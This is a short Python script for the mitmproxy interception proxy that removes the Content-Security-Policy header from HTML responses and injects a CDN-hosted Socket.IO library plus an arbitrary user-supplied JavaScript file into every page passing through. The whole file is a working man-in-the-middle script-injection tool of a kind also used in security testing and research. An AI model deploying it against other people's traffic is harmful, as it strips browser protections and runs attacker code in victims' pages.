from bs4 import BeautifulSoup   # nice representation of the DOM
from netlib.http import decoded


def start(context, argv):
    if len(argv) < 2:
        raise ValueError("Script name must be provided as the first parameter")
    context.script = argv[1]


def response(context, flow):
    if flow.request.host in context.script:
        return  # Make sure JS isn't injected to itself
    with decoded(flow.response):
        html = BeautifulSoup(flow.response.content)
        if html.body and ("text/html" in flow.response.headers["content-type"]):     # inject only for HTML resources
            # delete CORS header if present
            if "Content-Security-Policy" in flow.response.headers:
                del flow.response.headers["Content-Security-Policy"]
            # inject SocketIO library from CDN
            cdn = html.new_tag("script", type="text/javascript", src="//cdnjs.cloudflare.com/ajax/libs/socket.io/1.3.6/socket.io.min.js")
            html.body.insert(0, cdn)
            script = html.new_tag("script", type="application/javascript")
            script.insert(0, read_file(context.script))
            html.body.insert(1, script)
            flow.response.content = str(html)
            context.log("script injected")


def read_file(filename):
    with open(filename) as f:
        return f.read()
